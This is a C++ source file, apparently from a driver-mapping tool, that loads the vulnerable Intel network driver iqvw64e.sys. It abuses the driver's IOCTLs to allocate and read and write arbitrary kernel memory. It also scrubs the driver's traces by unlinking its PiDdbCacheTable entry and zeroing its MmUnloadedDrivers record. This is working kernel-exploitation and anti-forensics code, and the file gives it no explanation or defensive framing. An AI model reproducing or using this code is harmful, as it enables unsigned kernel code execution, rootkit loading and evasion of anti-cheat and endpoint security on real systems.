#include "../include/intel_driver.h"
#include "../include/mapper.h"
#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include <Psapi.h>

#pragma comment(lib, "Psapi.lib")

static HANDLE g_IntelHandle   = INVALID_HANDLE_VALUE;
static bool   g_ServiceLoaded = false;

// Helper R/W forward declarations (defined below)
static bool  _ReadKMem(HANDLE h, void* dst, uint64_t src, size_t sz);
static bool  _WriteKMem(HANDLE h, uint64_t dst, const void* src, size_t sz);
static uint64_t _ReadQWord(HANDLE h, uint64_t addr);
static bool  _WriteQWord(HANDLE h, uint64_t addr, uint64_t val);

// ─────────────────────────────────────────────────────────────────────────────
// Service management
// ─────────────────────────────────────────────────────────────────────────────
static SC_HANDLE CreateKernelService(const std::wstring& path, const std::wstring& name)
{
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return nullptr;

    SC_HANDLE hOld = OpenServiceW(hSCM, name.c_str(), DELETE);
    if (hOld) { DeleteService(hOld); CloseServiceHandle(hOld); }

    SC_HANDLE hSvc = CreateServiceW(hSCM, name.c_str(), name.c_str(),
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE, path.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr);
    CloseServiceHandle(hSCM);
    return hSvc;
}

static void StopDeleteService(const std::wstring& name)
{
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return;
    SC_HANDLE hSvc = OpenServiceW(hSCM, name.c_str(), SERVICE_STOP | DELETE);
    if (hSvc) {
        SERVICE_STATUS ss{};
        ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
        DeleteService(hSvc);
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hSCM);
}

// ─────────────────────────────────────────────────────────────────────────────
namespace IntelDriver {

HANDLE Load(const std::wstring& driverPath)
{
    SC_HANDLE hSvc = CreateKernelService(driverPath, INTEL_SERVICE_NAME);
    if (!hSvc) {
        std::cerr << "[intel] CreateService failed: " << GetLastError() << "\n";
        return INVALID_HANDLE_VALUE;
    }
    if (!StartServiceW(hSvc, 0, nullptr)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            std::cerr << "[intel] StartService failed: " << err << "\n";
            CloseServiceHandle(hSvc);
            StopDeleteService(INTEL_SERVICE_NAME);
            return INVALID_HANDLE_VALUE;
        }
    }
    CloseServiceHandle(hSvc);
    g_ServiceLoaded = true;

    HANDLE h = CreateFileW(INTEL_DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

    if (h == INVALID_HANDLE_VALUE) {
        std::cerr << "[intel] CreateFile Nal failed: " << GetLastError() << "\n";
        StopDeleteService(INTEL_SERVICE_NAME);
        return INVALID_HANDLE_VALUE;
    }
    g_IntelHandle = h;
    std::cout << "[intel] driver loaded\n";
    return h;
}

void Unload()
{
    if (g_IntelHandle != INVALID_HANDLE_VALUE) {
        CloseHandle(g_IntelHandle);
        g_IntelHandle = INVALID_HANDLE_VALUE;
    }
    if (g_ServiceLoaded) {
        StopDeleteService(INTEL_SERVICE_NAME);
        g_ServiceLoaded = false;
    }
}

HANDLE GetHandle() { return g_IntelHandle; }

uint64_t AllocatePool(HANDLE h, size_t size)
{
    DWORD   out = 0;
    uint64_t inSz  = (uint64_t)size;
    uint64_t outAddr = 0;
    DeviceIoControl(h, IOCTL_IQVW64_ALLOC_NONPAGED,
        &inSz, sizeof(inSz), &outAddr, sizeof(outAddr), &out, nullptr);
    return outAddr;
}

bool FreePool(HANDLE h, uint64_t addr)
{
    DWORD out = 0;
    return !!DeviceIoControl(h, IOCTL_IQVW64_FREE_POOL,
        &addr, sizeof(addr), nullptr, 0, &out, nullptr);
}

bool WriteKernelMemory(HANDLE h, uint64_t dst, const void* src, size_t sz)
{
    return _WriteKMem(h, dst, src, sz);
}

bool ReadKernelMemory(HANDLE h, void* dst, uint64_t src, size_t sz)
{
    return _ReadKMem(h, dst, src, sz);
}

bool WriteKernelQWord(HANDLE h, uint64_t addr, uint64_t val)
{
    return _WriteQWord(h, addr, val);
}

uint64_t ReadKernelQWord(HANDLE h, uint64_t addr)
{
    return _ReadQWord(h, addr);
}

// ─────────────────────────────────────────────────────────────────────────────
// PiDdb cache cleanup
// ─────────────────────────────────────────────────────────────────────────────
bool ClearPiDdbCache(HANDLE h, const std::wstring&, uint32_t)
{
    HMODULE hNtos = LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtos) return false;

    MODULEINFO mi{};
    GetModuleInformation(GetCurrentProcess(), hNtos, &mi, sizeof(mi));

    uint64_t localBase  = (uint64_t)hNtos;
    uint64_t kernelBase = GetNtoskrnlBase();
    uint64_t imageSize  = mi.SizeOfImage;

    auto toKernel = [&](uint64_t la) { return kernelBase + (la - localBase); };

    // Pattern scan helper
    auto Scan = [&](const uint8_t* pat, const char* mask, size_t len) -> uint64_t {
        uint8_t* base = (uint8_t*)localBase;
        for (uint64_t i = 0; i < imageSize - len; i++) {
            bool ok = true;
            for (size_t j = 0; j < len; j++)
                if (mask[j] == 'x' && base[i+j] != pat[j]) { ok = false; break; }
            if (ok) return localBase + i;
        }
        return 0;
    };

    // PiDdbLock — 48 8B 0D ?? ?? ?? ?? 4C 8B C6 E8
    static const uint8_t PAT_LOCK[] = {
        0x48,0x8B,0x0D,0xCC,0xCC,0xCC,0xCC,
        0x4C,0x8B,0xC6,0xE8
    };
    // PiDdbCacheTable — 66 03 D2 48 8D 0D ?? ?? ?? ??
    static const uint8_t PAT_TABLE[] = {
        0x66,0x03,0xD2,0x48,0x8D,0x0D,
        0xCC,0xCC,0xCC,0xCC
    };

    uint64_t lockLocal = Scan(PAT_LOCK,  "xxx????xxx?", sizeof(PAT_LOCK));
    uint64_t tabLocal  = Scan(PAT_TABLE, "xxxxxx????",  sizeof(PAT_TABLE));

    FreeLibrary(hNtos);

    if (!lockLocal || !tabLocal) {
        std::cerr << "[piddb] pattern not found — update signatures for this build\n";
        return false;
    }

    // Résoudre les adresses kernel via RIP-relative
    int32_t lockRel  = *(int32_t*)(lockLocal + 3);
    uint64_t lockKrn = toKernel(lockLocal + 7 + lockRel);

    int32_t tabRel   = *(int32_t*)(tabLocal + 6);
    uint64_t tabKrn  = toKernel(tabLocal + 10 + tabRel);

    std::cout << "[piddb] lock  @ 0x" << std::hex << lockKrn << "\n";
    std::cout << "[piddb] table @ 0x" << std::hex << tabKrn  << "\n";

    // Parcourir la liste chaînée de la RTL_AVL_TABLE
    // RTL_AVL_TABLE.ListHead est à +0x18
    uint64_t listHead  = tabKrn + 0x18;
    uint64_t listFlink = _ReadQWord(h, listHead);

    // Timestamp d'iqvw64e.sys — fixe dans le PE header
    const uint32_t IQVW64E_TS = 0x5284EAC3;

    uint64_t target = 0;
    uint64_t cur    = listFlink;
    for (int i = 0; i < 512 && cur && cur != listHead; i++) {
        // PIDDB_CACHE_ENTRY: LIST_ENTRY(0x10) + UNICODE_STRING(0x10) = timestamp à +0x20
        uint32_t ts = (uint32_t)_ReadQWord(h, cur + 0x20);
        if (ts == IQVW64E_TS) { target = cur; break; }
        cur = _ReadQWord(h, cur);   // Flink
    }

    if (!target) {
        std::cout << "[piddb] entry not found (already clean)\n";
        return true;
    }

    // Détacher de la liste doublement chaînée
    uint64_t flink = _ReadQWord(h, target + 0x00);
    uint64_t blink = _ReadQWord(h, target + 0x08);
    _WriteQWord(h, blink + 0x00, flink);
    _WriteQWord(h, flink + 0x08, blink);

    std::cout << "[piddb] entry unlinked @ 0x" << std::hex << target << "\n";
    return true;
}

// ─────────────────────────────────────────────────────────────────────────────
// MmUnloadedDrivers cleanup
// ─────────────────────────────────────────────────────────────────────────────
bool ClearMmUnloadedDrivers(HANDLE h, const std::wstring&)
{
    HMODULE hNtos = LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtos) return false;

    uint64_t localBase  = (uint64_t)hNtos;
    uint64_t kernelBase = GetNtoskrnlBase();

    uint64_t ulLocal  = (uint64_t)GetProcAddress(hNtos, "MmUnloadedDrivers");
    uint64_t cntLocal = (uint64_t)GetProcAddress(hNtos, "MmLastUnloadedDriver");
    FreeLibrary(hNtos);

    if (!ulLocal || !cntLocal) {
        std::cerr << "[mmul] exports not found\n";
        return false;
    }

    uint64_t ulKrn  = kernelBase + (ulLocal  - localBase);
    uint64_t cntKrn = kernelBase + (cntLocal - localBase);

    // MmUnloadedDrivers = PUNLOADED_DRIVERS (pointeur vers tableau)
    uint64_t tablePtr = _ReadQWord(h, ulKrn);
    uint32_t lastIdx  = (uint32_t)_ReadQWord(h, cntKrn);

    // UNLOADED_DRIVERS entry = 56 bytes
    // +00 UNICODE_STRING Name (Length/MaxLen à +00, Buffer à +08)
    // +10 StartAddress
    // +18 EndAddress
    // +20 CurrentTime
    const size_t ENTRY_SZ  = 56;
    const size_t MAX_ENTRIES = 50;

    for (uint32_t i = 0; i < MAX_ENTRIES; i++) {
        uint64_t entryAddr = tablePtr + i * ENTRY_SZ;
        uint16_t nameLen   = (uint16_t)_ReadQWord(h, entryAddr + 0);
        uint64_t nameBuf   = _ReadQWord(h, entryAddr + 8);

        if (!nameBuf || !nameLen || nameLen > 512) continue;

        std::vector<wchar_t> nameMem(nameLen / 2 + 1, 0);
        _ReadKMem(h, nameMem.data(), nameBuf, nameLen);
        std::wstring drvName(nameMem.data(), nameLen / 2);

        if (drvName.find(L"iqvw64e") != std::wstring::npos ||
            drvName.find(L"IQVW64E") != std::wstring::npos)
        {
            // Zero l'entrée complète
            std::vector<uint8_t> zeros(ENTRY_SZ, 0);
            _WriteKMem(h, entryAddr, zeros.data(), ENTRY_SZ);

            // Décrémenter MmLastUnloadedDriver
            if (lastIdx > 0) {
                uint32_t newCnt = lastIdx - 1;
                _WriteQWord(h, cntKrn, newCnt);
            }
            std::cout << "[mmul] entry " << i << " cleared\n";
            return true;
        }
    }

    std::cout << "[mmul] iqvw64e not found (already clean)\n";
    return true;
}

} // namespace IntelDriver

// ─────────────────────────────────────────────────────────────────────────────
// Implémentations internes R/W
// ─────────────────────────────────────────────────────────────────────────────
static bool _ReadKMem(HANDLE h, void* dst, uint64_t src, size_t sz)
{
    struct { uint64_t Dst, Src, Len; } req{ (uint64_t)dst, src, (uint64_t)sz };
    DWORD out = 0;
    return !!DeviceIoControl(h, IOCTL_IQVW64_READ_PHYS,
        &req, sizeof(req), dst, (DWORD)sz, &out, nullptr);
}

static bool _WriteKMem(HANDLE h, uint64_t dst, const void* src, size_t sz)
{
    struct { uint64_t Dst, Src, Len; } req{ dst, (uint64_t)src, (uint64_t)sz };
    DWORD out = 0;
    return !!DeviceIoControl(h, IOCTL_IQVW64_COPY_MEMORY,
        &req, sizeof(req), nullptr, 0, &out, nullptr);
}

static uint64_t _ReadQWord(HANDLE h, uint64_t addr)
{
    uint64_t val = 0;
    _ReadKMem(h, &val, addr, sizeof(val));
    return val;
}

static bool _WriteQWord(HANDLE h, uint64_t addr, uint64_t val)
{
    return _WriteKMem(h, addr, &val, sizeof(val));
}
